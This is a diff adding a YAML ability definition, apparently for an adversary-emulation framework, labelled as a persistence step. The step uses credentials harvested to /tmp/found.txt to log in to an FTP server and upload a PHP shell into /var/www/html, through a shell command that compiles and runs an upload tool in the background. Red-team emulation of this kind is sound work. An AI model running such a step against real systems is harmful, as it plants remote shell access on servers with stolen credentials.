@@ -1,0 +1,37 @@
+- tactic: persistence
+  technique_name: 'User Execution: Malicious File'
+  technique_id: TB005
+  name: FTP access and upload
+  description: Uses the credentials and the ip address stored in the file at /tmp/found.txt
+    in the form "name:password:ip_address" to login to the ftp server and then uploads
+    a php script that executes a shell into /var/www/html
+  executors:
+  - name: sh
+    platform: linux
+    command: g++ -std=c++11 ftp_put_file.cpp -o /tmp/ftp_put_file; mv ftp_put.exp
+      /tmp/ftp_put.exp; chmod +x /tmp/ftp_put.exp; /tmp/ftp_put_file "$(< /tmp/found.txt)"
+      &
+    code: null
+    language: null
+    build_target: null
+    payloads:
+    - ftp_put_file.cpp
+    - shell.php
+    - ftp_put.exp
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - defense-evasion
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: bab3b55a-4bdc-4d4d-9a92-77c7d1b2624d
